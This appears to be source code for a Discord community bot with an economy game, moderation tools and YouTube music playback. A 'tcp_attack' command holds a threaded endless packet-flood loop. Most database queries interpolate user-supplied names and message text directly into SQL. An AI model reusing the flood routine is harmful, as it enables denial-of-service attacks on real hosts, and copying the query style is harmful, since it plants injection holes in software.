...
huntcl = {}
shopitems = {"Shovel": 12.5,"Pickaxe": 17.25, "Rifle": 45, "Anti-rob pack": 5.75, "Fishing rod": 7.5, "Redbull": 0.60, "Wallet expander": 10, "Phone": 25.75, "Pistol": 80, "Bread": 1.3, "Gum": 0.45, "Ammo": 8.5, "Monster": 1.75, "Pet food": 4.25, "Cheese": 0.5, "Hamburger": 3.75, "Pizza" : 4, "Gyros": 4.25, "Taco": 4}
sellitems = {"Fish": 1.75, "Coal": 0.95, "Ruby": 5.67, "Iron": 3.29, "Diamond": 8.32, "Gold": 7.42, "Silver": 2.74, "Copper": 1.59, "Junk": 0.45, "Stone": 0.2, "Empty beer": 0.77, "Steel": 1.96, "Broken glass": 0.47, "Rabbit": 2.5, "Deer": 5.75, "Sheep": 4.25, "Bear": 8, "Capybara": 10.25, "Cow": 6.25, "tape": 1.78, "vape": 3.42, "wood": 2.74, "cigar": 3.28, "cheese": 1.94}
usersettings = {}
donations = {}
antirob = {}
dead = {}
...
async def on_ready():
    ...
    cmdchannel = bot.get_channel(1003636710837584013)
    now = datetime.now()
    global current_time
...
async def on_voice_state_update(member, before, after):
    ...
    if before.channel is None and after.channel is not None:
        privatevoice = discord.utils.get(member.guild.voice_channels, id=1064262326016016495)
...
async def on_member_join(user):
    ...
    if queryresult.fetchone() is None:
        c.execute(f"INSERT INTO userjoins (uid, username, joindate) VALUES (\"{user.id}\", \"{user}\", \"{datetime.now()}\")")
    ...
    added = user.guild.get_role(998217799187050555)
...
async def info(interaction: discord.Interaction):
    """Get all information you need to know about the bot"""
    if not interaction.channel.id == 1107018544236998787: 
        embed = discord.Embed(title = "Info", color=discord.Color.blue())
        embed.set_thumbnail(url=bot.user.avatar.url)
        embed.set_author(name="L.E.G.A.C.Y. community")
        embed.add_field(name="Creators", value="- Tremzye\n- Simplyhexagon", inline=False)
        embed.add_field(name="Programming environment", value=f"> {sys.version}", inline=True)
        commands_count = 0
        async def print_command(command, level=0):
            nonlocal commands_count
            commands_count += 1
            if isinstance(command, commands.Group):
                for subcommand in command.commands:
                    await print_command(subcommand, level + 1)
...
async def nitro(interaction: discord.Interaction, amount: int):
    ...
    if not interaction.channel.id == 1107018544236998787:
        premiumrole = interaction.user.guild.get_role(987712422376792095)
...
async def lock(interaction: discord.Interaction, time: int):
    ...
    if not interaction.channel.id == 1107018544236998787:
        if interaction.user.guild_permissions.mute_members:
            await interaction.channel.set_permissions(interaction.user.guild.default_role, send_messages = False)
...
async def work(interaction: discord.Interaction):
    ...
    if not interaction.channel.id == 1107018544236998787:
            ...
            if interaction.user.id in workcl and time.time() - workcl[interaction.user.id] < COOLDOWN:
                ...
                moneygot = round(random.uniform(0.5, 5), 2)
                database = sqlite3.connect("bot.db")
                c = database.cursor()
                queryresult = c.execute(f"SELECT cash FROM money WHERE uid = \"{interaction.user.id}\"")
                does_exist = queryresult.fetchone()
                if does_exist is None:
                    c.execute(f"INSERT INTO money (uid, username, cash) VALUES (\"{interaction.user.id}\", \"{interaction.user}\",{moneygot})")
                    database.commit()
                else:
    ...
    if not interaction.channel.id == 1107018544236998787:
        ...
        if not payorevade:
            ...
            if payorevade.value == 1:
                ...
                does_exist = queryresult.fetchone()
                if does_exist is None:
                    c.execute(f"INSERT INTO tax (uid, username, amount) VALUES (\"{interaction.user.id}\", \"{interaction.user}\", 0)")
                    ...
                    if does_exist is None:
                        c.execute(f"INSERT INTO money (uid, username, cash) VALUES (\"{interaction.user.id}\", \"{interaction.user}\", 0)")
            ...
            if payorevade.value == 2:
                if interaction.user.id in evadecl and time.time() - evadecl[interaction.user.id] < 84600:
                    embed = discord.Embed(title="Tax-hacker", description=f"The sad thing is, that they disable their servers for 24 hours after an attack because of security reasons... Next time i can try hacking in is tomorrow about `{datetime.utcfromtimestamp(int(datetime.now().timestamp()) + int(time.time() - evadecl[interaction.user.id]))} (UTC)`", color=discord.Color.blue())
                    print(time.time() - evadecl[interaction.user.id])
                    await interaction.response.send_message(embed = embed)
                else:
                    global randomnum
...
class Taxevade(discord.ui.View):
    ...
    async def taxbtn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if randomnum < guess:
            embed = discord.Embed(title="Tax-hacker", description=f"The cracker worked! I hacked into the government and set your tax to 0!", color=discord.Color.red())
        ...
        if interaction.user.id in huntcl and time.time() - huntcl[interaction.user.id] < 30:
            ...
            if does_exist:
                if random.randint(0, 4) > 1:
                    ...
                    c.execute(f"INSERT INTO inventory (uid, username, itemname, amount) VALUES (\"{interaction.user.id}\", \"{interaction.user}\" \"{currentitem}\", 1)")
...
@bot.tree.command(name="utcnow")
async def utc(interaction: discord.Interaction):
    """Display the current UTC (Universal Time Coordinated)"""
    await interaction.response.send_message(f"UTC: `{datetime.utcfromtimestamp(int(datetime.now().timestamp()))}`\nTimestamp: `{int(datetime.now().timestamp())}`")
    ...
    if not interaction.channel.id == 1107018544236998787:
        ...
        if not buy:
            ...
            if buy.name in shopitems:
                ...
                db = sqlite3.connect("bot.db")
                c = db.cursor()
                queryresult = c.execute(f"SELECT uid, cash FROM money WHERE uid = \"{interaction.user.id}\"")
                queryresultfetched = queryresult.fetchone()
                if queryresultfetched and queryresultfetched[1] >= price:
                    #if interaction.user.id not in inv:
                    #    inv[interaction.user.id] = []
                    setmoney = queryresultfetched[1] - shopitems[buy.name]
                    c.execute(f"INSERT INTO inventory (uid, username, itemname, amount) VALUES (\"{interaction.user.id}\", \"{interaction.user}\", \"{buy.name}\", 1)")
                    c.execute(f"UPDATE money SET cash = {setmoney} WHERE uid = \"{interaction.user.id}\"")
                    db.commit()
                    c.close()
                    db.close()
        ...
        if user:
            if user.id in usersettings and usersettings[user.id]["Private Money"] == True:
                ...
                if does_exist is None:
                    ...
                    currentmoney = does_exist[0]
                    embed = discord.Embed(title="Balance", description=f"{user.mention} has `{round(currentmoney, 2)}$`", color=discord.Color.blue())
                    await interaction.response.send_message(embed = embed)  
                c.close()
                database.close()
        else:
            ...
            if does_exist is None:
                ...
                currentmoney = does_exist[0]
                embed = discord.Embed(title="Balance", description=f"Sir, you have `{round(currentmoney, 2)}$`", color=discord.Color.blue())
                await interaction.response.send_message(embed = embed)  
...
async def balance(interaction: discord.Interaction, setting: typing.Optional[discord.app_commands.Choice[int]], setvalue: typing.Optional[bool]):
    ...
    if setting:
        if setvalue == None:
            ...
            does_exist = queryresult.fetchone()
            if not does_exist:
                c.execute(f"INSERT INTO settings (uid, username, privatemoney, privateinventory) VALUES (\"{interaction.user.id}\", \"{interaction.user}\", false, false)")
            queryresult = c.execute(f"SELECT privatemoney, privateinventory FROM settings WHERE uid = \"{interaction.user.id}\"")
            does_exist = queryresult.fetchone()
...
class Sell(discord.ui.View):
    ...
    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
        ...
        queryresultfetched = queryresult.fetchone()
        if queryresultfetched is None:
            c.execute(f"INSERT INTO money (uid, username, cash) VALUES (\"{interaction.user.id}\", \"{interaction.user}\", {moneyget})")
        else:
...
@bot.tree.command(name="tcp_attack")
async def tcp_attack(interaction: discord.Interaction):
    ...
    def startddos(sent):
        while True:
            sockresult = sock.sendto(bytes,(ip, port))
            sent += 1
            print("Sent " + str(sent) + " packets to " + ip + ", answer: "+ str(sockresult))
    for i in range(20):
        t = threading.Thread(target=startddos(sent=sent))
        t.start()
...
async def crime(interaction: discord.Interaction):
    ...
    if not interaction.channel.id == 1107018544236998787:
        ...
        if interaction.user.id in crimecl and time.time() - crimecl[interaction.user.id] < COOLDOWN:
            ...
            if random.randint(0, 4) > 1:
                moneygot = round(random.uniform(5.00, 20.00), 2)
                db = sqlite3.connect("bot.db")
                c = db.cursor()
                queryresult = c.execute(f"SELECT cash FROM money WHERE uid = \"{interaction.user.id}\"")
                current_money = queryresult.fetchone()
                c.execute(f"UPDATE money SET cash = {current_money[0] + moneygot} WHERE uid = \"{interaction.user.id}\"")
                db.commit()
                ...
                moneylose = round(random.uniform(5.00, 20.00), 2)
                db = sqlite3.connect("bot.db")
                c = db.cursor()
                queryresult = c.execute(f"SELECT cash FROM money WHERE uid = \"{interaction.user.id}\"")
                current_money = queryresult.fetchone()
                c.execute(f"UPDATE money SET cash = {current_money[0] - moneylose} WHERE uid = \"{interaction.user.id}\"")
                db.commit()
...
class Help(discord.ui.View):
    ...
    async def helpbtn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in usertickets:
            ...
            admin_role = interaction.guild.get_role(1105572440874176582)
            if admin_role:
            ...
            embed = discord.Embed(title="Help", description=f"{interaction.user.mention}, here you can request help, ask questions from the admin team.", color=discord.Color.blue())
...
class TradeView3(discord.ui.View):
    ...
    async def accept(self, interaction: discord.Interaction, button: discord.ui.Button):
        ...
        if queryresultfetched[0] > 1:
            ...
            c.execute(f"INSERT INTO inventory (uid, username, itemname, amount) VALUES (\"{interaction.user.id}\" , \"{interaction.user}\", \"{tradeitem2}\", 1)")
        ...
        if queryresultfetched[0] > 1:
            ...
            c.execute(f"INSERT INTO inventory (uid, username, itemname, amount) VALUES (\"{trader.id}\", \"{trader}\", \"{tradeitem1}\", 1)")
    ...
    if not interaction.channel.id == 1107018544236998787:
        ...
        if interaction.user.id in trashcl and time.time() - trashcl[interaction.user.id] < COOLDOWN:
            ...
            if random.randint(0, 5) > 1:
                ...
                c.execute(f"INSERT INTO inventory (uid, username, itemname, amount) VALUES (\"{interaction.user.id}\", \"{interaction.user}\", \"{item}\", 1)")
...
async def fish(interaction: discord.Interaction):
    ...
    if not interaction.channel.id == 1107018544236998787:
        database = sqlite3.connect("bot.db")
        c = database.cursor()
        queryresult = c.execute(f"SELECT itemname, amount FROM inventory WHERE uid = \"{interaction.user.id}\" AND itemname = \"Fishing rod\" AND amount >= 1")
        does_exist = queryresult.fetchone()
        print(does_exist)
        if does_exist is None:
            ...
            await interaction.response.send_message(embed=embed)
                ...
                if random.randint(0, 6) > 1:
                    c.execute(f"INSERT INTO inventory (uid, username, itemname, amount) VALUES (\"{interaction.user.id}\", \"{interaction.user}\", \"Fish\", 1)")
                    database.commit()
    ...
    if not interaction.channel.id == 1107018544236998787:
        ...
        if interaction.user.guild_permissions.mute_members:
            if interaction.user.top_role > user.top_role:
                await user.add_roles(user.guild.get_role(982758490953109594))
                ...
                await user.remove_roles(user.guild.get_role(982758490953109594))
...
async def warn(interaction: discord.Interaction, user: discord.Member, reason: str):
    ...
    if interaction.user.guild_permissions.manage_messages:
        ...
        queryresultfetched = queryresult.fetchone()
        if queryresultfetched is None:
            c.execute(f"INSERT INTO warns (uid, username, warncount, date, reason, moderator, modname) VALUES (\"{user.id}\", \"{user}\", 1, \"{datetime.now()}\", \"{reason}\", \"{interaction.user.id}\", \"{interaction.user}\")")
            ...
            embed = discord.Embed(title = "Warn", description = f"**{user} has been warned by {interaction.user}.** *Current warns*: `{queryresultfetched[0] + 1}`", color=discord.Color.blue())
            await interaction.response.send_message(embed = embed)
            if (queryresultfetched[0] + 1) == 5:
                modchannel = bot.get_channel(1003636710837584013)
                embed = discord.Embed(title = "Warn - Action", description = f"**{user.name}{user.discriminator} has earned 5 warns, Reason: {queryresultfetched[2]} \nplease take an action bellow...**", color=discord.Color.blue())
...
class WarnAction(discord.ui.View):
    ...
    async def warnkick(self, interaction: discord.Interaction, button: discord.ui.Button):
        ...
        embed = discord.Embed(title = "Warn - Action", description = f"**{self.user} has been kicked**", color=discord.Color.blue())
        await self.modchannel.send(embed = embed)
        database = sqlite3.connect("bot.db")
        c = database.cursor()
        c.execute(f"UPDATE warns SET warncount = 0 WHERE uid = \"{self.user.id}\"")
    ...
    async def warnban(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self.user.ban()
        embed = discord.Embed(title = "Warn - Action", description = f"**{self.user} has been banned**", color=discord.Color.blue())
        await self.modchannel.send(embed = embed)
        database = sqlite3.connect("bot.db")
        c = database.cursor()
        c.execute(f"UPDATE warns SET warncount = 0 WHERE uid = \"{self.user.id}\"")
        ...
        c.close()
        database.close()
    @discord.ui.button(label="Ignore", custom_id="ignore", style=discord.ButtonStyle.gray)
    async def warnignore(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title = "Warn - Action", description = f"**{self.user}'s warns has been ignored**", color=discord.Color.blue())
        await self.modchannel.send(embed = embed)
        database = sqlite3.connect("bot.db")
        c = database.cursor()
        c.execute(f"UPDATE warns SET warncount = 0 WHERE uid = \"{self.user.id}\"")
...
async def unwarn(interaction: discord.Interaction, user: discord.Member, amount: int):
    if interaction.user.guild_permissions.manage_messages:
        database = sqlite3.connect("bot.db")
        c = database.cursor()
        queryresult = c.execute(f"SELECT warncount, date, reason, moderator FROM warns WHERE uid = \"{user.id}\"")
        queryresultfetched = queryresult.fetchone()
        if queryresultfetched:
            if queryresultfetched[0] != 0:
                c.execute(f"UPDATE warns SET warncount = {queryresultfetched[0] - 1} WHERE uid = \"{user.id}\"")
                embed = discord.Embed(title = "Unwarn", description = f"**{user}'s warns has been reduced by 1**", color=discord.Color.blue())
                await interaction.response.send_message(embed=embed)
                database.commit()
                c.close()
                database.close()
            else:
                embed = discord.Embed(title = "Unwarn", description = f"**{user} has already 0 warns**", color=discord.Color.blue())
                await interaction.response.send_message(embed=embed)
        else:
            embed = discord.Embed(title = "Unwarn", description = f"**{user} has never been warned**", color=discord.Color.blue())
            await interaction.response.send_message(embed=embed)
    else:
        embed = discord.Embed(title = "Unwarn", description = f"**You dont have permissions for this command**", color=discord.Color.blue())
        await interaction.response.send_message(embed=embed)
...
async def watch(interaction: discord.Interaction, user: discord.Member):
    ...
    if not interaction.channel.id == 1107018544236998787:
        if interaction.user.guild_permissions.manage_messages:
            ...
            does_exist = queryresult.fetchone()
            if not does_exist:
                c.execute(f"INSERT INTO watcheds (uid, username) VALUES (\"{user.id}\", \"{user}\")")
                database.commit()
            c.close()
            database.close()
        else:
...
async def leaderboard(interaction: discord.Interaction):
    ...
    for i in range(len(queryresultfetched)):
        try:
            ...
            try:   
                user = await bot.fetch_user(queryresultfetched[i+1][0])
            except:
                continue
        username = user.name
...
@bot.tree.command(name="rickroll")
async def rickroll(interaction: discord.Interaction, user: discord.Member):
    """Rickroll someone (works 75% of the time)"""
    try:
        vchannel = await interaction.guild.fetch_channel(1175739059755290634)
        vclient = await vchannel.connect()
        await user.send("hello, get in lounge vc pls i wanna show u smthng :3")
        await interaction.response.send_message("Okay, i prepared everything. Im waiting...")
        while(user not in vchannel.members):
            await asyncio.sleep(1)
            if bot.user not in vchannel.members:
                break
        path = "./tmp/"
        print("Fetching video...")
        ...
        global vid
        vid = path + filen
        vclient.play(discord.FFmpegPCMAudio(vid))
    except:
        pass
...
async def disconnect(interaction: discord.Interaction):
    ...
    await interaction.response.send_message("Voice client successfully closed")

class MusicDropdown(discord.ui.Select):
    def __init__(self, musics):
        options = []
        for music in musics:
            options.append(discord.SelectOption(label=music))
        super().__init__(placeholder='Choose a song...', options=options, min_values=1, max_values=1)
    async def callback(self, interaction: discord.Interaction):
        try:
            value = self.values[0]
            await interaction.channel.send(f"Playing {value} for {interaction.user.voice.channel.mention}")
            path = "./tmp/"
            filen = value
            print(path + filen)
            vclient = await interaction.user.voice.channel.connect()
            vclient.play(discord.FFmpegPCMAudio(path+filen))
        except Exception as ex:
            print(ex)
            for vclient in bot.voice_clients:
                if vclient.channel == interaction.user.voice.channel:
                    vclient.play(discord.FFmpegPCMAudio(path+filen))

class MusicView(discord.ui.View):
    def __init__(self, musics):
        super().__init__(timeout=None)
        self.add_item(MusicDropdown(musics))

@bot.tree.command(name="musics")
async def search(interaction: discord.Interaction):
    """Search for a music that is already downloaded"""
    try:
        path = "./tmp/"
        files = []
        for file in os.listdir(path):
            files.append(file)
        embed = discord.Embed(title="Musics", description="Here are the already downloaded musics", color=discord.Color.blue())
        await interaction.response.send_message(embed=embed, view=MusicView(files))
    except Exception as ex:
        print(ex)

@bot.tree.command(name="connect")
async def connect(interaction: discord.Interaction, channel: typing.Optional[discord.VoiceChannel]):
    """Connect to voice channel"""
    if channel:
        await channel.connect()
        await interaction.response.send_message("Successfully joined the channel")
    else:
        ...
        if interaction.user.voice is not None:
            try:
                ...
                try:
                    ...
                    for vclient in bot.voice_clients:
                        if vclient.channel == interaction.user.voice.channel:
                            player = vclient.play(discord.FFmpegPCMAudio(vid))
            except Exception as error:
                await interaction.channel.send(f"An error occured while processing command")
                traceback.print_exc()
        else:
            await interaction.channel.send(f"You are not in a voice channel.")
...
async def restart(interaction: discord.Interaction):
    ...
    for vclient in bot.voice_clients:
        if vclient.channel == interaction.user.voice.channel:
            vclient.stop()
            await asyncio.sleep(1)
            await vclient.play(discord.FFmpegPCMAudio(vid))
...
@bot.tree.command(name="ezforence")
async def ezforence(interaction: discord.Interaction):
    """Easter egg sound"""
    try:
        vclient = await interaction.user.voice.channel.connect()
        vclient.play(discord.FFmpegPCMAudio("easter_egg_1.mp3"))
    except:
        for vclient in bot.voice_clients:
            if vclient.channel == interaction.user.voice.channel:
                vclient.play(discord.FFmpegPCMAudio("easter_egg_1.mp3"))
...
@bot.tree.command(name="mewhen")
async def mewhen(interaction: discord.Interaction, user: discord.Member):
    """Meme when someone is doing something stupid or annoying"""
    memeimage: discord.File = discord.File("image_1.gif")
    await interaction.channel.send(f"me when {user} starts speaking", file=memeimage)

class Playlist(discord.ui.View):
    def __init__(self, url):
        self.url = url
        super().__init__()
    @discord.ui.button(label="Add", custom_id="addtopl", style=discord.ButtonStyle.blurple)
    async def addtopl(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            database = sqlite3.connect("bot.db")
            c = database.cursor()
            path = "./tmp/"
            ...
            yt = YouTube(self.url)               
            filen = f"{yt.title}" + ".mp3"
            if not os.path.exists(path + filen.replace('/', '')):
                print("Processing video...")
                print(f"{path}{filen}")
                stream = yt.streams.get_audio_only()
                if not os.path.exists(path):
                    os.makedirs(path)
                print("Downloading video...")
                stream.download(output_path=path, filename=filen.replace('/', ''))
                print("Opening video...")
            global vid
            vid = path + filen.replace('/', '')
            print(f"Video full path: {vid}")
            c.execute(f"INSERT INTO playlists (uid, username, path) VALUES (\"{interaction.user.id}\", \"{interaction.user}\", \"{vid}\")")
            database.commit()
            c.close()
            database.close()
            await interaction.channel.send("Music successfully added to playlist")
            self.stop()
        except Exception as ex:
            print(ex)
    @discord.ui.button(label="Cancel", custom_id="cancelpl", style=discord.ButtonStyle.blurple)
    async def cancelpl(self, interaction: discord.Interaction, button: discord.ui.Button):
...
class PlaylistDropdown(discord.ui.Select):
    def __init__(self, songs):
        options = []
        for song in songs:
            options.append(discord.SelectOption(label=song))
        super().__init__(placeholder="Choose a song...", options=options, min_values=1, max_values=1)
    async def callback(self, interaction: discord.Interaction):
        try:
            value = self.values[0]
...
class PlaylistView(discord.ui.View):
    def __init__(self, songs):
        super().__init__(timeout=None)
        self.add_item(PlaylistDropdown(songs))

class PlaylistDropdown1(discord.ui.Select):
    def __init__(self, user):
        self.user = user
        options = []
        database = sqlite3.connect("bot.db")
        c = database.cursor()
        queryresult = c.execute(f"SELECT path FROM playlists WHERE uid = \"{user.id}\"")
        queryresultfetched = queryresult.fetchall()
        for music in queryresultfetched:
            options.append(discord.SelectOption(label=music[0].split('./tmp/')[1]))
        super().__init__(placeholder="Choose a song...", options = options, min_values=1, max_values=1)
    async def callback(self, interaction: discord.Interaction):
        song = self.values[0]
        database = sqlite3.connect("bot.db")
        c = database.cursor()
        queryresult = c.execute(f"DELETE FROM playlists WHERE uid = \"{self.user.id}\" AND path = \"{'./tmp/' + song}\"")
        os.remove('./tmp/' + song)
        database.commit()
        c.close()
        database.close()
        await interaction.channel.send(f"Successfully deleted `{song}` from your playlist")

class PlaylistView1(discord.ui.View):
    def __init__(self, user):
        super().__init__()
        self.add_item(PlaylistDropdown1(user))

@bot.tree.command(name="playlist")
@app_commands.choices(operation=[discord.app_commands.Choice(name = "Add", value=1), discord.app_commands.Choice(name = "Remove", value=2), discord.app_commands.Choice(name = "Clear", value=3), discord.app_commands.Choice(name="Play", value=4)])
async def playlist(interaction: discord.Interaction, operation: typing.Optional[app_commands.Choice[int]], url: typing.Optional[str]):
    """View or edit your playlist"""
    if operation:
        if operation.value == 1:
            database = sqlite3.connect("bot.db")
            c = database.cursor()
            queryresult = c.execute(f"SELECT path FROM playlists WHERE uid = \"{interaction.user.id}\"")
            queryresultfetched = queryresult.fetchall()
            if not len(queryresultfetched) >= 15:
                yt = YouTube(url)
                embed = discord.Embed(title="Playlist", description=f"Video name: `{yt.title}`\nVideo length: `{yt.length}s`\nVideo publisher: `{yt.author}`", color=discord.Color.blue())
                await interaction.response.send_message(embed=embed, view=Playlist(url))
            else:
                embed = discord.Embed(title="Playlist", description=f"You have reached your playlist max size (15 musics). With premium you can have up to 25 musics!", color=discord.Color.blue())
                await interaction.response.send_message(embed=embed, view=Playlist(url))
        elif operation.value == 4:
            database = sqlite3.connect("bot.db")
            c = database.cursor()
            queryresult = c.execute(f"SELECT uid, username, path FROM playlists WHERE uid = \"{interaction.user.id}\"")
            queryresultfetched = queryresult.fetchall()
            songs = []
            for song in queryresultfetched:
                songs.append(song[2].split('./tmp/')[1])
            try:
                vclient = await interaction.user.voice.channel.connect()
            except Exception as ex:
                pass
            for current in songs:
                await interaction.channel.send(f"Playing {current} for {interaction.user.voice.channel.mention}")
                path = "./tmp/"
                filen = current
                print(path + filen)
                try:
            ...
            embed = discord.Embed(title="Playlist", description=f"Select a music that you want to remove: ", color=discord.Color.blue())
            await interaction.response.send_message(embed=embed, view=PlaylistView1(interaction.user))
        elif operation.value == 3:
            ...
    else:
        database = sqlite3.connect("bot.db")
        ...
        if queryresultfetched:
            musics = ""
            for music in queryresultfetched:
                musics += f"\n- {music[2].split('./tmp/')[1].replace('.mp3', '')}"
            embed = discord.Embed(title="Playlist", description=f"Here is your playlist:\n{musics}\n\nPlay musics:", color=discord.Color.blue())
            songs = []
            for song in queryresultfetched:
                splitted = song[2].split('./tmp/')[1]
                songs.append(splitted.replace('.mp3', ''))
            print(songs)
            await interaction.response.send_message(embed=embed, view=PlaylistView(songs))
        else:
            embed = discord.Embed(title="Playlist", description="Your playlist is empty! You can add some musics with /playlist operation:Add", color=discord.Color.blue())
            await interaction.response.send_message(embed=embed)
@bot.event
async def on_message(message):
    ...
    if message.channel.id == 998219001182302218:
        if message.author in codes and mscontent[0] == codes[message.author]:
            ...
            verifyrem = discord.utils.get(message.guild.roles, id=998217799187050555)
            await message.author.remove_roles(verifyrem)
            verifyadd = discord.utils.get(message.guild.roles, id=980889699780542564)
    ...
    does_exist = queryresult.fetchone()
    if does_exist is None:
        c.execute(f"INSERT INTO tax (uid, username, amount) VALUES (\"{message.author.id}\", \"{message.author}\", {len(mscontent)})")
        database.commit()
    else:
        currenttax = does_exist[0]
    ...
    try:
        ...
        if datetime.now().weekday() == 6 or datetime.now().weekday() == 7:
            msgwords = msgwords*2
            print("doubling xp")
        database = sqlite3.connect("bot.db")
        c = database.cursor()
        ...
        does_exist = queryresult.fetchone()
        if does_exist is None:
            c.execute(f"INSERT INTO levels (uid, username, xp, level) VALUES (\"{message.author.id}\", \"{message.author}\", {msgwords}, 0)")
            database.commit()
        else:
            ...
            if((newxp//100) > (currentxp // 100)):
                levelchannel = message.guild.get_channel(1105418899132010557)
                await levelchannel.send(f"**{message.author} levelled up to {newxp // 100}! Congratulations!**")
            else:
                pass
            if newxp//100 >= 5:
                if message.guild.get_role(1175739448940564532) not in message.author.roles:
                    await message.author.add_roles(message.guild.get_role(1175739448940564532))
                    levelchannel = message.guild.get_channel(1105418899132010557)
                    await levelchannel.send(f"**{message.author} is now an active user! Thank you for your activity**")
    except Exception as e:
    ...
    if any(activateword in message.content.lower() for activateword in activatewords):
        ...
        database = sqlite3.connect("bot.db")
        c = database.cursor()
        c.execute(f"INSERT INTO suspecteds (uid, username, reason, date, moderator) VALUES (\"{message.author.id}\", \"{message.author}\", \"Message content: {message.content}\", \"{datetime.now()}\", \"System\")")
        database.commit()
        c.close()
        database.close()
